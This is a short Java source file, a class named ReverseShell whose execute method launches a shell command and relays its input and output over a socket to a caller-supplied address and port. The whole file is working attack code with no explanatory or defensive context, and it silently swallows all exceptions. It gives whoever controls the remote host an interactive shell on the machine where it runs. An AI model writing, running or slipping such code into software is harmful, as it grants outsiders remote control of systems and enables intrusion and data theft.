import java.io.InputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;

public class ReverseShell {
  public static void execute(String cmd, String address, String port) throws InterruptedException, IOException {
		try {
			Process p = new ProcessBuilder(new String[] { "sh", "-c", cmd }).redirectErrorStream(true).start();
			Socket s = new Socket(address, Integer.valueOf(port));
			InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
			OutputStream po = p.getOutputStream(), so = s.getOutputStream();
			while (!s.isClosed()) {
				while (pi.available() > 0)
					so.write(pi.read());
				while (pe.available() > 0)
					so.write(pe.read());
				while (si.available() > 0)
					po.write(si.read());
				so.flush();
				po.flush();
				Thread.sleep(50);
				try {
					p.exitValue();
					break;
				} catch (Exception e) {}
			}
			p.destroy();
			s.close();
		} catch (Exception e) {}
	}
}